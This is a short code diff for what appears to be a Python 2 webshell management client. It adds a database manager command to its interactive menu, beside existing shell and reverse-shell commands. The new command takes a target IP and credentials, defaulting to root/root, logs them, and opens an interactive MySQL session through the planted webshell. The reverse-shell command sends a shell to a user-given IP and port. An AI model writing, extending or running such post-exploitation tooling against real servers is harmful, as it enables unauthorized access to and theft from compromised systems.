@@ -4,6 +4,7 @@
 from core.webshell import WebShell
 from core.shell import Shell
 from core.log import Log
+from core.db import Mysql
 
 import sys
 import string
@@ -20,9 +21,10 @@ def show_help():
 
 def main_help():
     print "Commands : "
-    print "        1. [h|help|?] : show this help"
-    print "        2. [sh|shell] : start an interactive shell"
-    print "        3. [rsh|rshell] : start an reverse shell"
+    print "        0. [h|help|?] : show this help"
+    print "        1. [sh|shell] : start an interactive shell"
+    print "        2. [rsh|rshell] : start an reverse shell"
+    print "        3. [db|database] : database manager"
     print "        4. [q|quit|exit] : quit"
 
 def main():
@@ -41,7 +43,7 @@ def main():
 
     while True:
         Log.context("sniper")
-        context = string.lower(raw_input("=>"))
+        context = string.lower(raw_input("=>") or "h")
         if context == "h" or context == "help" or context == "?":
             main_help()
         elif context == "sh" or context == "shell":
@@ -52,6 +54,17 @@ def main():
             port = raw_input("[PORT] : ")
             Log.info("Starting reverse shell (%s:%s)" % (ip, port))
             webshell.reverse_shell(ip, port)
+        elif context == "db" or context == "database":
+            ip = raw_input("IP (127.0.0.1): ") or "127.0.0.1"
+            username = raw_input("Username (root): ") or "root"
+            password = raw_input("Password (root): ") or "root"
+            Log.info("Creating connection by [%s:%s] to [%s]..." % (username, password, ip))
+            mysql_connection = Mysql(webshell, ip, username, password)
+            if mysql_connection.function != "":
+                Log.info("Entering database server interactive mode...")
+                mysql_connection.interactive()
+            else:
+                Log.error("No supported database function!")
         elif context == "q" or context == "quit" or context == "exit":
             Log.info("Quiting...")
             break
